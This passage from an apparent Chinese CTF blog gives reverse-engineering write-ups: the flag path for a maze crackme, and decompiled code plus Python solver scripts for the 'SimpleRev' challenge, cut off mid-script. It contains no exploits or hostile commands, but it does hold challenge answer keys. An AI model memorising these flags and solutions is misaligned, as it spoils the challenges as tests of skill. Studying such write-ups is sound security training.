<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>	<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v3<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v3<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">4</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre>	<span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">if</span> <span class="token punctuation">(</span> v7<span class="token punctuation">[</span><span class="token number">5</span> <span class="token operator">*</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v3<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">41</span> <span class="token operator">+</span> v4<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">49</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token keyword">if</span> <span class="token punctuation">(</span> v7<span class="token punctuation">[</span><span class="token number">5</span> <span class="token operator">*</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v3<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">41</span> <span class="token operator">+</span> v4<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">35</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\nok, the order you enter is the flag!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>提示信息是让左右移动，很容易知道这是一个<strong>横向为 5 迷宫</strong>题</p>
<p>可知是<strong>碰到 1 则退出，以 * 为起点，最终需要走到#</strong></p>
<p>如此得到迷宫结构如下：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">*</span><span class="token number">1111</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">01000</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token number">01010</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token number">00010</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token number">1111</span>#</pre></td></tr></table></figure><p>根据运行结果可以知道要想出去的路径为 <code>222441144222</code></p>
<p>而这也就是我们想要的 flag 了</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>flag<span class="token punctuation">&#123;</span><span class="token number">222441144222</span><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h2 id="simplerev"><a class="anchor" href="#simplerev">#</a> SimpleRev</h2>
<p>SimpleRev (flag 需加上 flag {} 再提交) 注意：得到的 flag 请包上 flag {} 提交</p>
<p>pe 查壳，并没有套什么壳，而且我们可以知道是 64 位</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220325131354054.png" alt="image-20220325131354054" /></p>
<p>ida pro 分析</p>
<p>一番查找并没有发现什么有用的东西</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220325131746956.png" alt="image-20220325131746956" /></p>
<p>f5 反编译得到如下：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">int</span> __cdecl __noreturn <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment">// eax</span></pre></td></tr><tr><td data-num="4"></td><td><pre>  <span class="token keyword">char</span> v4<span class="token punctuation">;</span> <span class="token comment">// [rsp+Fh] [rbp-1h]</span></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre>  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre>  <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Welcome to CTF game!\nPlease input d/D to start or input q/Q to quit this program: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>      v4 <span class="token operator">=</span> <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v4 <span class="token operator">!=</span> <span class="token number">100</span> <span class="token operator">&amp;&amp;</span> v4 <span class="token operator">!=</span> <span class="token number">68</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre>        <span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>      <span class="token function">Decry</span><span class="token punctuation">(</span><span class="token string">"Welcome to CTF game!\nPlease input d/D to start or input q/Q to quit this program: "</span><span class="token punctuation">,</span> argv<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v4 <span class="token operator">==</span> <span class="token number">113</span> <span class="token operator">||</span> v4 <span class="token operator">==</span> <span class="token number">81</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre>      <span class="token function">Exit</span><span class="token punctuation">(</span><span class="token string">"Welcome to CTF game!\nPlease input d/D to start or input q/Q to quit this program: "</span><span class="token punctuation">,</span> argv<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Input fault format!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    v3 <span class="token operator">=</span> <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token function">putchar</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220325131906057.png" alt="image-20220325131906057" /></p>
<p>分析主函数可知关键代码如下：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Welcome to CTF game!\nPlease input d/D to start or input q/Q to quit this program: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>      v4 <span class="token operator">=</span> <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v4 <span class="token operator">!=</span> <span class="token number">100</span> <span class="token operator">&amp;&amp;</span> v4 <span class="token operator">!=</span> <span class="token number">68</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre>        <span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>      <span class="token function">Decry</span><span class="token punctuation">(</span><span class="token string">"Welcome to CTF game!\nPlease input d/D to start or input q/Q to quit this program: "</span><span class="token punctuation">,</span> argv<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>重点肯定在 Decry () 这个函数里，点击跟进如下：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">unsigned</span> __int64 <span class="token function">Decry</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>  <span class="token keyword">char</span> v1<span class="token punctuation">;</span> <span class="token comment">// [rsp+Fh] [rbp-51h]</span></pre></td></tr><tr><td data-num="4"></td><td><pre>  <span class="token keyword">int</span> v2<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-50h]</span></pre></td></tr><tr><td data-num="5"></td><td><pre>  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment">// [rsp+14h] [rbp-4Ch]</span></pre></td></tr><tr><td data-num="6"></td><td><pre>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-48h]</span></pre></td></tr><tr><td data-num="7"></td><td><pre>  <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment">// [rsp+1Ch] [rbp-44h]</span></pre></td></tr><tr><td data-num="8"></td><td><pre>  <span class="token keyword">char</span> src<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+20h] [rbp-40h] BYREF</span></pre></td></tr><tr><td data-num="9"></td><td><pre>  __int64 v7<span class="token punctuation">;</span> <span class="token comment">// [rsp+28h] [rbp-38h]</span></pre></td></tr><tr><td data-num="10"></td><td><pre>  <span class="token keyword">int</span> v8<span class="token punctuation">;</span> <span class="token comment">// [rsp+30h] [rbp-30h]</span></pre></td></tr><tr><td data-num="11"></td><td><pre>  __int64 v9<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+40h] [rbp-20h] BYREF</span></pre></td></tr><tr><td data-num="12"></td><td><pre>  <span class="token keyword">int</span> v10<span class="token punctuation">;</span> <span class="token comment">// [rsp+50h] [rbp-10h]</span></pre></td></tr><tr><td data-num="13"></td><td><pre>  <span class="token keyword">unsigned</span> __int64 v11<span class="token punctuation">;</span> <span class="token comment">// [rsp+58h] [rbp-8h]</span></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre>  v11 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>  <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>src <span class="token operator">=</span> <span class="token number">0x534C43444ELL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token comment">// 16 进制编码为‘0x534c43444e’数据在内存中是小端顺序，高位在高地址处，低位在低地址处，故实际的字符顺序应为 '0x4e44434c53' 转为字符为 'NDCLS'</span></pre></td></tr><tr><td data-num="18"></td><td><pre>  v7 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>  v8 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>  v9<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x776F646168LL</span><span class="token punctuation">;</span> <span class="token comment">// 同理解出为 'hadow'</span></pre></td></tr><tr><td data-num="21"></td><td><pre>  v9<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>  v10 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>  text <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">join</span><span class="token punctuation">(</span>key3<span class="token punctuation">,</span> v9<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//key3='kills'  ; 这个 join 函数，就是把 key3 和 v9 两个字符串相连即 'killshadow'</span></pre></td></tr><tr><td data-num="24"></td><td><pre>  <span class="token function">strcpy</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> key1<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>  <span class="token function">strcat</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> src<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// key1 = 'ADSFK',key = 'ADSFKNDCLS'</span></pre></td></tr><tr><td data-num="26"></td><td><pre>  v2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>  v3 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="28"></td><td><pre><span class="token comment">// 这里是对一些变量赋值其中 text,strcpy,strcat 中出现了 key 需要注意一下这里是把 key1,src 的值拷贝到 key 中而 text 这里有一个字符串类型的指针指向的地址上的值就是 key3+v9</span></pre></td></tr><tr><td data-num="29"></td><td><pre>  <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="30"></td><td><pre>  v5 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> v5<span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="32"></td><td><pre>  <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span> key<span class="token punctuation">[</span>v3 <span class="token operator">%</span> v5<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">64</span> <span class="token operator">&amp;&amp;</span> key<span class="token punctuation">[</span>v3 <span class="token operator">%</span> v5<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">90</span> <span class="token punctuation">)</span><span class="token comment">// 将 key 的字符转为小写的算法，即 key = 'adsfkndcls'</span></pre></td></tr><tr><td data-num="34"></td><td><pre>      key<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> key<span class="token punctuation">[</span>v3 <span class="token operator">%</span> v5<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">32</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="35"></td><td><pre>    <span class="token operator">++</span>v3<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="36"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="37"></td><td><pre><span class="token comment">// 注意这里有一个 for 循环这个循环的作用就是对 key 的值进行大小写转化，而 v5 的值也就是 key 的长度通过 strlen 读取而得。</span></pre></td></tr><tr><td data-num="38"></td><td><pre>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Please input your flag:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="39"></td><td><pre>  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="40"></td><td><pre>  <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="41"></td><td><pre>    v1 <span class="token operator">=</span> <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="42"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">==</span> <span class="token number">10</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="43"></td><td><pre>      <span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="44"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">==</span> <span class="token number">32</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="45"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="46"></td><td><pre>      <span class="token operator">++</span>v2<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="47"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="48"></td><td><pre>    <span class="token keyword">else</span></pre></td></tr><tr><td data-num="49"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="50"></td><td><pre>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">&lt;=</span> <span class="token number">96</span> <span class="token operator">||</span> v1 <span class="token operator">></span> <span class="token number">122</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="51"></td><td><pre>      <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="52"></td><td><pre>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">></span> <span class="token number">64</span> <span class="token operator">&amp;&amp;</span> v1 <span class="token operator">&lt;=</span> <span class="token number">90</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="53"></td><td><pre>        <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="54"></td><td><pre>          str2<span class="token punctuation">[</span>v2<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>v1 <span class="token operator">-</span> <span class="token number">39</span> <span class="token operator">-</span> key<span class="token punctuation">[</span>v3 <span class="token operator">%</span> v5<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">97</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> <span class="token number">97</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="55"></td><td><pre>          <span class="token operator">++</span>v3<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="56"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="57"></td><td><pre>      <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="58"></td><td><pre>      <span class="token keyword">else</span></pre></td></tr><tr><td data-num="59"></td><td><pre>      <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="60"></td><td><pre>        str2<span class="token punctuation">[</span>v2<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>v1 <span class="token operator">-</span> <span class="token number">39</span> <span class="token operator">-</span> key<span class="token punctuation">[</span>v3 <span class="token operator">%</span> v5<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">97</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> <span class="token number">97</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="61"></td><td><pre>        <span class="token operator">++</span>v3<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="62"></td><td><pre>      <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="63"></td><td><pre><span class="token comment">// 这里就是核心了也就是对你输入的字符进行处理</span></pre></td></tr><tr><td data-num="64"></td><td><pre><span class="token comment">// 第一个 if 是判断你输入的是否是小写字母</span></pre></td></tr><tr><td data-num="65"></td><td><pre><span class="token comment">// 第二个 if 是判断你输入的是否为大写字母</span></pre></td></tr><tr><td data-num="66"></td><td><pre><span class="token comment">// 在第二个 if 下面就是对 str2 [v2] 进行 (v1 - 39 - key [v3++ % v5] + 97) % 26 + 97 处理变换后 str2 [v1] 存放小写字母下面的操作类似就不分析了</span></pre></td></tr><tr><td data-num="67"></td><td><pre>      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token punctuation">(</span>v3 <span class="token operator">%</span> v5<span class="token punctuation">)</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="68"></td><td><pre>        <span class="token function">putchar</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="69"></td><td><pre>      <span class="token operator">++</span>v2<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="70"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="71"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="72"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>text<span class="token punctuation">,</span> str2<span class="token punctuation">)</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="73"></td><td><pre>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Congratulation!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="74"></td><td><pre>  <span class="token keyword">else</span></pre></td></tr><tr><td data-num="75"></td><td><pre>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Try again!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="76"></td><td><pre>  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v11<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="77"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220325132258086.png" alt="image-20220325132258086" /></p>
<p>方法一：（直接公式逆推）</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>text <span class="token operator">=</span> <span class="token string">'killshadow'</span><span class="token comment">#=str2</span></pre></td></tr><tr><td data-num="2"></td><td><pre>key <span class="token operator">=</span> <span class="token string">'adsfkndcls'</span></pre></td></tr><tr><td data-num="3"></td><td><pre>v3 <span class="token operator">=</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="4"></td><td><pre>v5 <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>n <span class="token operator">=</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="6"></td><td><pre>flag <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="9"></td><td><pre>        v1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>text<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">97</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">26</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>v3 <span class="token operator">%</span> v5<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">58</span></pre></td></tr><tr><td data-num="10"></td><td><pre>        <span class="token keyword">if</span><span class="token punctuation">(</span>v1 <span class="token operator">></span> <span class="token number">65</span> <span class="token keyword">and</span> v1 <span class="token operator">&lt;=</span> <span class="token number">90</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token punctuation">(</span>v1 <span class="token operator">>=</span> <span class="token number">97</span> <span class="token keyword">and</span> v5 <span class="token operator">&lt;=</span> <span class="token number">122</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="11"></td><td><pre>            flag<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre>            n <span class="token operator">=</span> n <span class="token operator">+</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="13"></td><td><pre>            <span class="token keyword">if</span><span class="token punctuation">(</span>n <span class="token operator">==</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="14"></td><td><pre>                <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre>                <span class="token keyword">break</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        v3 <span class="token operator">=</span> v3 <span class="token operator">+</span> <span class="token number">1</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220325133843127.png" alt="image-20220325133843127" /></p>
<p>方法二：写字典暴力密码正向破解</p>
<p>爆破一：</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>text <span class="token operator">=</span> <span class="token string">'killshadow'</span><span class="token comment">#=str2</span></pre></td></tr><tr><td data-num="2"></td><td><pre>key <span class="token operator">=</span> <span class="token string">'adsfkndcls'</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token comment">#暴力字典破解</span></pre></td></tr><tr><td data-num="5"></td><td><pre>v3 <span class="token operator">=</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="6"></td><td><pre>v5 <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre>dict1 <span class="token operator">=</span> <span class="token string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"</span></pre></td></tr><tr><td data-num="8"></td><td><pre>flag <span class="token operator">=</span> <span class="token string">""</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token 